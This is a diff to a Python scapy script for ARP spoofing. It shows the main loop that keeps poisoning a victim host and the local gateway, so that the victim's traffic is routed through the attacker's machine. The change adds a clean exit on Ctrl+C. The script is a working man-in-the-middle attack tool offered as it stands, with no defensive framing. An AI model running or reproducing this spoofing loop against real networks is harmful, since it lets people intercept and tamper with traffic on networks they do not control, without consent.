@@ -22,9 +22,15 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 sent_packets_count = 0
-while True:
-    spoof("192.168.1.228", "192.168.1.1")
-    spoof("192.168.1.1", "192.168.1.228")
-    sent_packets_count += 2
-    print("\r[+] Packets sent: " + str(sent_packets_count), end='')
-    time.sleep(2)
+try:
+    while True:
+        spoof("192.168.1.228", "192.168.1.1")
+        spoof("192.168.1.1", "192.168.1.228")
+        sent_packets_count += 2
+        print("\r[+] Packets sent: " + str(sent_packets_count), end='')
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("")
+    print("#####################")
+    print("[+] Detected Ctrl + C")
+    print("[!] Quitting...")
